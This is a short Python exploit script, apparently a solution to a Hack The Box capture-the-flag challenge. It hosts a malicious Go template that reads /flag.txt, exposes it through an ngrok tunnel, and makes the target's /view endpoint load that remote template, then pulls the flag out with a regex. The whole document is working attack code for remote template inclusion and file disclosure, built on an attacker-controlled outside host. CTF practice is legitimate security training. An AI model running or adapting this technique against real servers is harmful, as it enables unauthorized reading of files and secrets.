import os
import sys
import time
import re
import requests
from pyngrok import ngrok

url = sys.argv[1]

os.system("mkdir ngrok_payload")
f = open("ngrok_payload/index.tpl", "w")
f.write('<html><body><pre>{{ .OutFileContents "/flag.txt" }}</pre></body></html>')
f.close()

os.chdir("ngrok_payload")
os.system("python3 -m http.server 8000 &")
os.chdir("..")

tunnel = ngrok.connect(8000, bind_tls=True)
ngrok_serwer = tunnel.public_url

payload = f"http://{url}/view?page={ngrok_serwer}/index.tpl&remote=true"

res = requests.get(payload)
flag = re.search("HTB\\{.*?\\}", res.text)

if flag:
    print("flag:")
    print("")
    print(flag.group(0))
    print(flag.group(0))
